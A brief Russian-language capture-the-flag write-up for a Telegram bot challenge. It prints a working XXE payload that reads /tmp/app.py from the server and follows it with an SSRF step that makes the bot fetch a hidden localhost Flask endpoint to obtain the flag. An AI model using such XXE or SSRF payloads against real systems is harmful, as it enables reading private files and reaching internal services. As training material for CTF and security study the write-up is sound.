1. замечаем, что в описании тг-бота написано  `TODO: do NOT forget to remove /tmp/app.py file`
2. Находим ххе с возможностью чтения файлов, читаем файл /tmp/app.py в команде 
xml <-> json
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///tmp/app.py"> ]>
<foo>&xxe;</foo>
```

3. получаем /tmp/app.py в виде json в ответе от бота
видим, что там поднят фласк с одной ручкой localhost/flag_secret_url_2986c04d-4180-4dd6-a20d-21d3651333f4

4. Отдаем в команду xml2jsonfromurl http://127.0.0.1/flag_secret_url_2986c04d-4180-4dd6-a20d-21d3651333f4

5. Получаем флаг